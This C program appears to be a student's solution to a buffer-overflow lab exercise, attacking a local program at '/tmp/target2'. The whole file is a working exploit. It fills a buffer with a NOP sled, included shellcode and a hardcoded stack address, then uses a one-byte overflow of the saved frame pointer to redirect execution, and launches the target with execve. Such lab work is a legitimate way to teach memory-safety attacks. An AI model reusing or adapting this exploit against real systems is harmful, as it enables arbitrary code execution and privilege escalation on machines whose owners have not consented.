#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET; /*args[1] = "hi there";*/ env[0] = NULL;

  
  // malicious input buffer containing one byte of overflow
  char overflow_buf[109];

  // lets construct a buffer composed of nops, shellcode, address to shellcode (4 bytes addressing, actually to nopsled ;)), +1 byte to overflow $eip framepointer

  // lets make a nice nop sled so we dont need to specify the exact address of where our shellcode lives on the buffer
  int i, j;
  for (i = 0; i <= 104 - sizeof(shellcode); i++) {
    overflow_buf[i] = 0x90;
  }

  // insert shellcode to buffer
  for (i = i, j = 0; j < sizeof(shellcode) - 1; i++, j++) {
    overflow_buf[i] = shellcode[j];
  }

  // now inspect the address of the buffer inside target and this will be placed into the last 4 bytes of the buffer (little endian)
  // 0xbffffd60  
  //0xbffffdc0 

  overflow_buf[i++] = 0x60;
  overflow_buf[i++] = 0xfd;
  overflow_buf[i++] = 0xff;
  overflow_buf[i++] = 0xbf;



  //  Overflow $eip ( $esp - 4 to jump over $ebp to directly set $eip ) so the instruction pointer points to some address 
  // in the nop sled to the shellcode i.e. this is a cheeky branch ~ manipulation of pc

  overflow_buf[i++] = 0xd0;
    /**
  printf("size of shellcode: %d\n", strlen(shellcode));
  int k;
  for (k = 0; k < sizeof(overflow_buf); k++) {
    printf("index %d: %hhx\n", k, overflow_buf[k]);
  }*/
  args[1] = overflow_buf; args[2] = NULL;

  if (0 > execve(TARGET, args, env)) // SIGTRAP on success
    fprintf(stderr, "execve failed.\n");
  return 0;
}
